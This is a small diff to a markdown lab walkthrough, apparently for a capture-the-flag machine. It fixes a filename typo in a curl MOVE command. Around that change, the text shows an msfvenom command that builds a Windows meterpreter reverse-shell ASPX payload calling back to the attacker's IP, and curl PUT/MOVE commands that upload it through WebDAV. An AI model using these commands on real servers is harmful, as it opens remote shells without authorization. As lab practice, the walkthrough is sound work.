@@ -125,7 +125,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.122 LPORT=9999 -f asp
 And perform the same actions to upload the file.<br>
 ```bash
 curl -X PUT http://10.10.10.15/ex.txt --data-binary @ex.aspx
-curl -X MOVE http://10.10.10.15/ex.text -H "Destination: http://10.10.10.15/ex.aspx"
+curl -X MOVE http://10.10.10.15/ex.txt -H "Destination: http://10.10.10.15/ex.aspx"
 ```
 Boot up Metasploit and start a shell. Set options accordingly:<br>
 ```bash
